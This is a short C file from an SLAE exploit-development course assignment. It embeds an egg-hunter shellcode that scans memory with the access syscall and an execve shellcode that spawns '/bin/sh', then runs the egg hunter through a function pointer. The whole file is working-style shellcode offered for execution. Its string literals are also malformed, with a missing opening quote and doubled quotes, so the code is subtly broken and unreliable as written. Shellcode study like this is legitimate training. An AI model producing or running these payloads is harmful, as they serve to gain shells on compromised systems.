
// SLAE Assignment #3: EGG Hunter Using Access Method
// Website:  http://blog.jsiob.com
// SLAE-ID: 1400


#include<stdio.h>
#include<string.h>


#define EGG "\x90\x50\x90\x50"

unsigned char egghunter[] = \

"\xbb"
EGG
\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

// Execve Shell
unsigned char code[] = \
EGG EGG
""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"";

main()
{
	
	printf("Egghunter Length:  %d\n", strlen(egghunter));
	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
